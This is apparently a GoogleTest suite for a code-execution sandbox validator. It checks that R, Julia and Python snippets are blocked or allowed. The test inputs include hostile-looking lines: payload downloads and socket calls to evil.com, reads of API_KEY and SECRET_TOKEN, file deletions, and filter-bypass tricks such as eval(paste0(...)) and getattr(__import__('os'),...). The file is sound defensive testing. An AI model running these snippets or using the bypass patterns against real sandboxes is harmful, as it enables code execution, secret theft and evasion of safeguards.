/**
 * Copyright (c) 2026 NEVEN Project
 * 
 * Comprehensive tests for SandboxVerifier.
 * Tests all blocked patterns for R and Julia, bypass prevention,
 * and edge cases.
 */

#include <gtest/gtest.h>
#include "SandboxVerifier.h"

using rj2xcl::security::SandboxVerifier;

class SandboxTest : public ::testing::Test {
protected:
    SandboxVerifier& sandbox = SandboxVerifier::GetInstance();
    std::string reason;

    bool IsBlocked(const std::string& code) {
        reason.clear();
        return !sandbox.ValidateCodeForExecution(code, reason);
    }

    bool IsAllowed(const std::string& code) {
        reason.clear();
        return sandbox.ValidateCodeForExecution(code, reason);
    }
};

// ═══════════════════════════════════════════════════════════════════
// R Shell Execution
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksSystem) {
    EXPECT_TRUE(IsBlocked("system('whoami')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksSystem2) {
    EXPECT_TRUE(IsBlocked("system2('cmd', '/c dir')"));
}

TEST_F(SandboxTest, R_BlocksShell) {
    EXPECT_TRUE(IsBlocked("shell('dir')"));
}

TEST_F(SandboxTest, R_BlocksShellExec) {
    EXPECT_TRUE(IsBlocked("shell.exec('notepad.exe')"));
}

TEST_F(SandboxTest, R_BlocksPipe) {
    EXPECT_TRUE(IsBlocked("pipe('ls')"));
}

// ═══════════════════════════════════════════════════════════════════
// R File Manipulation
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksFileRemove) {
    EXPECT_TRUE(IsBlocked("file.remove('important.txt')"));
}

TEST_F(SandboxTest, R_BlocksUnlink) {
    EXPECT_TRUE(IsBlocked("unlink('dir', recursive=TRUE)"));
}

TEST_F(SandboxTest, R_BlocksFileRename) {
    EXPECT_TRUE(IsBlocked("file.rename('a.txt', 'b.txt')"));
}

TEST_F(SandboxTest, R_BlocksFileCopy) {
    EXPECT_TRUE(IsBlocked("file.copy('secret.txt', 'C:/temp/')"));
}

TEST_F(SandboxTest, R_BlocksFileCreate) {
    EXPECT_TRUE(IsBlocked("file.create('malicious.bat')"));
}

// ═══════════════════════════════════════════════════════════════════
// R Network
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksDownloadFile) {
    EXPECT_TRUE(IsBlocked("download.file('http://evil.com/payload', 'out.exe')"));
}

TEST_F(SandboxTest, R_BlocksUrl) {
    EXPECT_TRUE(IsBlocked("url('http://evil.com/data')"));
}

TEST_F(SandboxTest, R_BlocksSocketConnection) {
    EXPECT_TRUE(IsBlocked("socketConnection('evil.com', 80)"));
}

// ═══════════════════════════════════════════════════════════════════
// R Dynamic Code Construction (Bypass Prevention)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksEvalParse) {
    EXPECT_TRUE(IsBlocked("eval(parse(text='system(\"dir\")'))"));
}

TEST_F(SandboxTest, R_BlocksDoCall) {
    EXPECT_TRUE(IsBlocked("do.call('system', list('dir'))"));
}

TEST_F(SandboxTest, R_BlocksMatchFun) {
    EXPECT_TRUE(IsBlocked("match.fun('system')('dir')"));
}

// ═══════════════════════════════════════════════════════════════════
// R Native Code Execution
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksDynLoad) {
    EXPECT_TRUE(IsBlocked("dyn.load('malicious.dll')"));
}

TEST_F(SandboxTest, R_BlocksDotC) {
    EXPECT_TRUE(IsBlocked(".C('native_func', arg1)"));
}

TEST_F(SandboxTest, R_BlocksDotCall) {
    EXPECT_TRUE(IsBlocked(".Call('native_func', arg1)"));
}

TEST_F(SandboxTest, R_BlocksDotFortran) {
    EXPECT_TRUE(IsBlocked(".Fortran('dgesv', n, a, lda)"));
}

TEST_F(SandboxTest, R_BlocksDotExternal) {
    EXPECT_TRUE(IsBlocked(".External('some_func')"));
}

// ═══════════════════════════════════════════════════════════════════
// R Environment Manipulation
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksSysGetenv) {
    EXPECT_TRUE(IsBlocked("Sys.getenv('API_KEY')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksSysGetenv_CaseInsensitive) {
    EXPECT_TRUE(IsBlocked("sys.getenv('SECRET_TOKEN')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksSysSetenv) {
    EXPECT_TRUE(IsBlocked("Sys.setenv(PATH='C:/evil')"));
}

TEST_F(SandboxTest, R_BlocksSetwd) {
    EXPECT_TRUE(IsBlocked("setwd('C:/Windows/System32')"));
}

// ═══════════════════════════════════════════════════════════════════
// R Case Insensitivity
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_CaseInsensitive_System) {
    EXPECT_TRUE(IsBlocked("SYSTEM('dir')"));
    EXPECT_TRUE(IsBlocked("System('dir')"));
    EXPECT_TRUE(IsBlocked("sYsTeM('dir')"));
}

TEST_F(SandboxTest, R_CaseInsensitive_DotCall) {
    EXPECT_TRUE(IsBlocked(".CALL('func')"));
    EXPECT_TRUE(IsBlocked(".Call('func')"));
}

// ═══════════════════════════════════════════════════════════════════
// R Whitespace Bypass Prevention
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_WhitespaceBypass_System) {
    EXPECT_TRUE(IsBlocked("sys tem('dir')"));
    EXPECT_TRUE(IsBlocked("system ('dir')"));
    EXPECT_TRUE(IsBlocked("  system('dir')  "));
}

// ═══════════════════════════════════════════════════════════════════
// R Paste Concatenation Bypass Prevention
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_PasteBypass_System) {
    EXPECT_TRUE(IsBlocked("eval(paste0('sys','tem(\"dir\")'))"));
}

TEST_F(SandboxTest, R_PasteBypass_Shell) {
    EXPECT_TRUE(IsBlocked("eval(paste('shell', '(\"cmd\")', sep=''))"));
}

TEST_F(SandboxTest, R_PasteBypass_Unlink) {
    EXPECT_TRUE(IsBlocked("do.call(paste0('un','link'), list('/tmp'))"));
}

// ═══════════════════════════════════════════════════════════════════
// R Assign + Envir Bypass Prevention
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_AssignEnvirBypass) {
    EXPECT_TRUE(IsBlocked("assign('my_system', system, envir=globalenv())"));
}

// ═══════════════════════════════════════════════════════════════════
// R Dynamic Symbol Lookup (Task 5.3)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksGet) {
    EXPECT_TRUE(IsBlocked("get('system')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksGet_DynamicLookup) {
    EXPECT_TRUE(IsBlocked("f <- get('system'); f('dir')"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// R Script/File Execution (Task 5.3)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksSource) {
    EXPECT_TRUE(IsBlocked("source('malicious.R')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksSource_URL) {
    EXPECT_TRUE(IsBlocked("source('http://evil.com/payload.R')"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// R Package Loading (Task 5.3)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksLibrary_Arbitrary) {
    EXPECT_TRUE(IsBlocked("library(malicious_pkg)"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// R Connection Opening (Task 5.3)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksOpen) {
    EXPECT_TRUE(IsBlocked("open(con)"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksOpen_Connection) {
    EXPECT_TRUE(IsBlocked("con <- pipe('cmd'); open(con)"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// R Internal Function Access (Task 5.3)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksDotInternal) {
    EXPECT_TRUE(IsBlocked(".Internal(inspect(x))"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksDotInternal_CaseInsensitive) {
    EXPECT_TRUE(IsBlocked(".INTERNAL(inspect(x))"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// R readLines Context-Aware Detection (Task 5.3)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_BlocksReadLines_Pipe) {
    EXPECT_TRUE(IsBlocked("readLines(pipe('whoami'))"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksReadLines_Pipe_Whitespace) {
    EXPECT_TRUE(IsBlocked("readLines( pipe('cmd /c dir') )"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksReadLines_Url) {
    EXPECT_TRUE(IsBlocked("readLines(url('http://evil.com/data'))"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_BlocksReadLines_SocketConnection) {
    EXPECT_TRUE(IsBlocked("readLines(socketConnection('evil.com', 80))"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_AllowsReadLines_File) {
    // readLines with a plain file path is safe and should be allowed
    EXPECT_TRUE(IsAllowed("readLines('data.txt')"));
}

TEST_F(SandboxTest, R_AllowsReadLines_NConnections) {
    // readLines with n argument on a file is safe
    EXPECT_TRUE(IsAllowed("readLines('log.txt', n=10)"));
}

// ═══════════════════════════════════════════════════════════════════
// R Allowed Operations (Must NOT be blocked)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, R_AllowsArithmetic) {
    EXPECT_TRUE(IsAllowed("1 + 1"));
}

TEST_F(SandboxTest, R_AllowsSqrt) {
    EXPECT_TRUE(IsAllowed("sqrt(144)"));
}

TEST_F(SandboxTest, R_AllowsPaste) {
    EXPECT_TRUE(IsAllowed("paste('hello', 'world')"));
}

TEST_F(SandboxTest, R_AllowsSum) {
    EXPECT_TRUE(IsAllowed("sum(1, 2, 3, 4, 5)"));
}

TEST_F(SandboxTest, R_BlocksLibrary) {
    EXPECT_TRUE(IsBlocked("library(ggplot2)"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, R_AllowsDataFrame) {
    EXPECT_TRUE(IsAllowed("data.frame(x=1:10, y=rnorm(10))"));
}

TEST_F(SandboxTest, R_AllowsProcTime) {
    EXPECT_TRUE(IsAllowed("proc.time()"));
}

TEST_F(SandboxTest, R_AllowsLm) {
    EXPECT_TRUE(IsAllowed("lm(y ~ x, data=df)"));
}

TEST_F(SandboxTest, R_AllowsPlot) {
    EXPECT_TRUE(IsAllowed("plot(1:10, rnorm(10))"));
}

TEST_F(SandboxTest, R_AllowsRVersion) {
    EXPECT_TRUE(IsAllowed("R.version.string"));
}

// ═══════════════════════════════════════════════════════════════════
// Julia Shell Execution
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksRun) {
    EXPECT_TRUE(IsBlocked("run(`ls`)"));
}

TEST_F(SandboxTest, Julia_BlocksRunParen) {
    EXPECT_TRUE(IsBlocked("run(Cmd([\"ls\"]))"));
}

TEST_F(SandboxTest, Julia_BlocksPipeline) {
    EXPECT_TRUE(IsBlocked("pipeline(`ls`, `grep foo`)"));
}

TEST_F(SandboxTest, Julia_BlocksBacktick) {
    EXPECT_TRUE(IsBlocked("`whoami`"));
}

// ═══════════════════════════════════════════════════════════════════
// Julia File Manipulation
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksRm) {
    EXPECT_TRUE(IsBlocked("rm(\"important.txt\")"));
}

TEST_F(SandboxTest, Julia_BlocksMv) {
    EXPECT_TRUE(IsBlocked("mv(\"a.txt\", \"b.txt\")"));
}

TEST_F(SandboxTest, Julia_BlocksCp) {
    EXPECT_TRUE(IsBlocked("cp(\"secret.txt\", \"/tmp/\")"));
}

TEST_F(SandboxTest, Julia_BlocksMkpath) {
    EXPECT_TRUE(IsBlocked("mkpath(\"/tmp/evil\")"));
}

// ═══════════════════════════════════════════════════════════════════
// Julia Native Code Execution
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksCcall) {
    EXPECT_TRUE(IsBlocked("ccall(:system, Cint, (Cstring,), \"dir\")"));
}

TEST_F(SandboxTest, Julia_BlocksAtCcall) {
    EXPECT_TRUE(IsBlocked("@ccall system(\"dir\"::Cstring)::Cint"));
}

TEST_F(SandboxTest, Julia_BlocksCglobal) {
    EXPECT_TRUE(IsBlocked("cglobal(:printf, Ptr{Cvoid})"));
}

// ═══════════════════════════════════════════════════════════════════
// Julia Dynamic Code
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksEval) {
    EXPECT_TRUE(IsBlocked("eval(:(1+1))"));
}

TEST_F(SandboxTest, Julia_BlocksMetaParse) {
    EXPECT_TRUE(IsBlocked("Meta.parse(\"system('dir')\")"));
}

TEST_F(SandboxTest, Julia_BlocksInclude) {
    EXPECT_TRUE(IsBlocked("include(\"malicious.jl\")"));
}

// ═══════════════════════════════════════════════════════════════════
// Julia Unsafe Operations
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksUnsafeLoad) {
    EXPECT_TRUE(IsBlocked("unsafe_load(ptr)"));
}

TEST_F(SandboxTest, Julia_BlocksUnsafeStore) {
    EXPECT_TRUE(IsBlocked("unsafe_store!(ptr, val)"));
}

TEST_F(SandboxTest, Julia_BlocksUnsafePointer) {
    EXPECT_TRUE(IsBlocked("unsafe_pointer_to_objref(ptr)"));
}

// ═══════════════════════════════════════════════════════════════════
// Julia Network
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksDownload) {
    EXPECT_TRUE(IsBlocked("download(\"http://evil.com/payload\")"));
}

// ═══════════════════════════════════════════════════════════════════
// Julia Unsafe Operations (Extended — Task 5.4)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksUnsafePointerToObjref) {
    EXPECT_TRUE(IsBlocked("unsafe_pointer_to_objref(ptr)"));
    EXPECT_FALSE(reason.empty());
    EXPECT_NE(reason.find("unsafe_pointer_to_objref"), std::string::npos);
}

TEST_F(SandboxTest, Julia_BlocksUnsafeWrap) {
    EXPECT_TRUE(IsBlocked("unsafe_wrap(Array, ptr, dims)"));
    EXPECT_FALSE(reason.empty());
    EXPECT_NE(reason.find("unsafe_wrap"), std::string::npos);
}

// ═══════════════════════════════════════════════════════════════════
// Julia Environment Variable Access (Task 5.4)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksENV_DictAccess) {
    EXPECT_TRUE(IsBlocked("ENV[\"API_KEY\"]"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Julia_BlocksENV_Standalone) {
    EXPECT_TRUE(IsBlocked("keys(ENV)"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Julia_BlocksENV_HasKey) {
    EXPECT_TRUE(IsBlocked("haskey(ENV, \"PATH\")"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Julia_BlocksENV_Assignment) {
    EXPECT_TRUE(IsBlocked("ENV[\"MY_VAR\"] = \"value\""));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Julia open() with Process/Cmd Patterns (Task 5.4)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksOpen_Backtick) {
    EXPECT_TRUE(IsBlocked("open(`ls -la`)"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Julia_BlocksOpen_Cmd) {
    EXPECT_TRUE(IsBlocked("open(Cmd([\"ls\", \"-la\"]))"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Julia Network (Extended — Task 5.4)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_BlocksSocketsConnect) {
    EXPECT_TRUE(IsBlocked("Sockets.connect(\"evil.com\", 80)"));
    EXPECT_FALSE(reason.empty());
    EXPECT_NE(reason.find("Sockets.connect"), std::string::npos);
}

TEST_F(SandboxTest, Julia_BlocksSocketsConnect_CaseInsensitive) {
    EXPECT_TRUE(IsBlocked("sockets.connect(\"evil.com\", 443)"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Julia Allowed Operations
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Julia_AllowsArithmetic) {
    EXPECT_TRUE(IsAllowed("1.0 + 1.0"));
}

TEST_F(SandboxTest, Julia_AllowsSqrt) {
    EXPECT_TRUE(IsAllowed("sqrt(144)"));
}

TEST_F(SandboxTest, Julia_AllowsString) {
    EXPECT_TRUE(IsAllowed("string(VERSION)"));
}

TEST_F(SandboxTest, Julia_AllowsArray) {
    EXPECT_TRUE(IsAllowed("[1, 2, 3, 4, 5]"));
}

TEST_F(SandboxTest, Julia_AllowsMap) {
    EXPECT_TRUE(IsAllowed("map(x -> x^2, [1,2,3])"));
}

// ═══════════════════════════════════════════════════════════════════
// Python Shell Execution (Task 8.1)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Python_BlocksOsSystem) {
    EXPECT_TRUE(IsBlocked("os.system('dir')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksOsPopen) {
    EXPECT_TRUE(IsBlocked("os.popen('ls')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksSubprocessCall) {
    EXPECT_TRUE(IsBlocked("subprocess.call(['ls', '-la'])"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksSubprocessRun) {
    EXPECT_TRUE(IsBlocked("subprocess.run(['echo', 'hello'])"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksSubprocessPopen) {
    EXPECT_TRUE(IsBlocked("subprocess.popen(['cmd', '/c', 'dir'])"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksSubprocessCheckOutput) {
    EXPECT_TRUE(IsBlocked("subprocess.check_output(['whoami'])"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksSubprocessCheckCall) {
    EXPECT_TRUE(IsBlocked("subprocess.check_call(['ls'])"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Python File Manipulation (Task 8.2)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Python_BlocksOsRemove) {
    EXPECT_TRUE(IsBlocked("os.remove('important.txt')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksOsUnlink) {
    EXPECT_TRUE(IsBlocked("os.unlink('secret.txt')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksOsRmdir) {
    EXPECT_TRUE(IsBlocked("os.rmdir('/tmp/data')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksOsRename) {
    EXPECT_TRUE(IsBlocked("os.rename('a.txt', 'b.txt')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksShutilRmtree) {
    EXPECT_TRUE(IsBlocked("shutil.rmtree('/tmp/data')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksShutilMove) {
    EXPECT_TRUE(IsBlocked("shutil.move('a.txt', '/tmp/')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksShutilCopy) {
    EXPECT_TRUE(IsBlocked("shutil.copy('secret.txt', '/tmp/')"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Python Dynamic Code Execution (Task 8.3)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Python_BlocksExec) {
    EXPECT_TRUE(IsBlocked("exec('import os; os.system(\"dir\")')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksEval) {
    EXPECT_TRUE(IsBlocked("eval('1+1')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksCompile) {
    EXPECT_TRUE(IsBlocked("compile('print(1)', '<string>', 'exec')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksDunderImport) {
    EXPECT_TRUE(IsBlocked("__import__('os')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksImportlib) {
    EXPECT_TRUE(IsBlocked("importlib.import_module('subprocess')"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Python Native/Unsafe (Task 8.4)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Python_BlocksCtypesCdll) {
    EXPECT_TRUE(IsBlocked("ctypes.cdll.LoadLibrary('libc.so')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksCtypesWindll) {
    EXPECT_TRUE(IsBlocked("ctypes.windll.kernel32"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksCtypesCDLL) {
    EXPECT_TRUE(IsBlocked("ctypes.CDLL('libc.so')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksCtypesWinDLL) {
    EXPECT_TRUE(IsBlocked("ctypes.WinDLL('kernel32')"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Python Network (Task 8.5)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Python_BlocksUrllib) {
    EXPECT_TRUE(IsBlocked("urllib.request.urlopen('http://evil.com')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksSocket) {
    EXPECT_TRUE(IsBlocked("socket.socket(socket.AF_INET, socket.SOCK_STREAM)"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksHttpClient) {
    EXPECT_TRUE(IsBlocked("http.client.HTTPConnection('evil.com')"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Python Environment Manipulation (Task 8.6)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Python_BlocksOsEnviron) {
    EXPECT_TRUE(IsBlocked("os.environ['PATH'] = '/evil'"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksOsPutenv) {
    EXPECT_TRUE(IsBlocked("os.putenv('PATH', '/evil')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_BlocksOsChdir) {
    EXPECT_TRUE(IsBlocked("os.chdir('/tmp')"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Python Bypass Prevention (Task 8.7)
// ═══════════════════════════════════════════════════════════════════

// Whitespace insertion
TEST_F(SandboxTest, Python_WhitespaceBypass_OsSystem) {
    EXPECT_TRUE(IsBlocked("os . system('dir')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_WhitespaceBypass_OsSystemParen) {
    EXPECT_TRUE(IsBlocked("os.system ('dir')"));
    EXPECT_FALSE(reason.empty());
}

// Case variation
TEST_F(SandboxTest, Python_CaseBypass_Upper) {
    EXPECT_TRUE(IsBlocked("OS.SYSTEM('dir')"));
    EXPECT_FALSE(reason.empty());
}

TEST_F(SandboxTest, Python_CaseBypass_Mixed) {
    EXPECT_TRUE(IsBlocked("Os.System('dir')"));
    EXPECT_FALSE(reason.empty());
}

// getattr bypass
TEST_F(SandboxTest, Python_GetattrBypass) {
    EXPECT_TRUE(IsBlocked("getattr(__import__('os'), 'system')('dir')"));
    EXPECT_FALSE(reason.empty());
}

// String concatenation bypass
TEST_F(SandboxTest, Python_StringConcatBypass) {
    EXPECT_TRUE(IsBlocked("x = \"os\" + \".system\"; eval(x + \"('dir')\")"));
    EXPECT_FALSE(reason.empty());
}

// ═══════════════════════════════════════════════════════════════════
// Python Allowed Operations (Task 8.8)
// ═══════════════════════════════════════════════════════════════════

TEST_F(SandboxTest, Python_AllowsImportPandas) {
    EXPECT_TRUE(IsAllowed("import pandas as pd"));
    EXPECT_TRUE(reason.empty());
}

TEST_F(SandboxTest, Python_AllowsDescribe) {
    EXPECT_TRUE(IsAllowed("df.describe()"));
    EXPECT_TRUE(reason.empty());
}

TEST_F(SandboxTest, Python_AllowsNpMean) {
    EXPECT_TRUE(IsAllowed("np.mean([1,2,3])"));
    EXPECT_TRUE(reason.empty());
}

TEST_F(SandboxTest, Python_AllowsLen) {
    EXPECT_TRUE(IsAllowed("len([1,2,3])"));
    EXPECT_TRUE(reason.empty());
}

TEST_F(SandboxTest, Python_AllowsArithmetic) {
    EXPECT_TRUE(IsAllowed("x = 42 + 3.14"));
    EXPECT_TRUE(reason.empty());
}

TEST_F(SandboxTest, Python_AllowsPrint) {
    EXPECT_TRUE(IsAllowed("print('hello world')"));
    EXPECT_TRUE(reason.empty());
}

TEST_F(SandboxTest, Python_AllowsListComprehension) {
    EXPECT_TRUE(IsAllowed("[x**2 for x in range(10)]"));
    EXPECT_TRUE(reason.empty());
}

TEST_F(SandboxTest, Python_AllowsStringFormat) {
    EXPECT_TRUE(IsAllowed("f'Hello {name}, you are {age} years old'"));
    EXPECT_TRUE(reason.empty());
}
